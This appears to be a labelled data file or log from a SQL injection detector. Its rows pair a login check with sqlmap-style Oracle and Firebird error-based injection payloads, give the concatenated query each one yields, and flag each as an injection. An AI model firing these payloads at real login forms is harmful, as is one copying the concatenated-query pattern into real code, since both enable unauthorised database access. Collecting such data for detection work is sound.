SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 8680=UTL_INADDR.GET_HOST_ADDRESS(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (8680=8680) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)) AND "Nbei" LIKE "Nbei	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 8680=UTL_INADDR.GET_HOST_ADDRESS(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (8680=8680) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)) AND "Nbei" LIKE "Nbei';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (2089=2089	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (2089=2089';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345)) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((2635=2635	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345)) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((2635=2635';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (((4614=4614	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (((4614=4614';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345 AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345 AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58)))';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ('FSdf'='FSdf	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ('FSdf'='FSdf';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (('ssLT'='ssLT	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (('ssLT'='ssLT';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((('nXid'='nXid	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((('nXid'='nXid';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND 'iPHP'='iPHP	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND 'iPHP'='iPHP';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ('kJiS' LIKE 'kJiS	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ('kJiS' LIKE 'kJiS';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (('mlwH' LIKE 'mlwH	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (('mlwH' LIKE 'mlwH';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((('NApP' LIKE 'NApP	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((('NApP' LIKE 'NApP';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND 'BrgV' LIKE 'BrgV	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND 'BrgV' LIKE 'BrgV';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ("LzJo"="LzJo	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ("LzJo"="LzJo';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (("mhpS"="mhpS	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (("mhpS"="mhpS';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((("KLJe"="KLJe	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((("KLJe"="KLJe';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND "CNBG"="CNBG	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND "CNBG"="CNBG';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ("GxBp" LIKE "GxBp	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ("GxBp" LIKE "GxBp';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (("WTyf" LIKE "WTyf	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND (("WTyf" LIKE "WTyf';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((("iVSH" LIKE "iVSH	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND ((("iVSH" LIKE "iVSH';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND "RxOK" LIKE "RxOK	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 205=CTXSYS.DRITHSX.SN(205,(CHR(58)||CHR(104)||CHR(110)||CHR(120)||CHR(58)||(SELECT (CASE WHEN (205=205) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(108)||CHR(110)||CHR(97)||CHR(58))) AND "RxOK" LIKE "RxOK';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')';	sqlInjection--KEY_VALUE_SEPARATOR--true
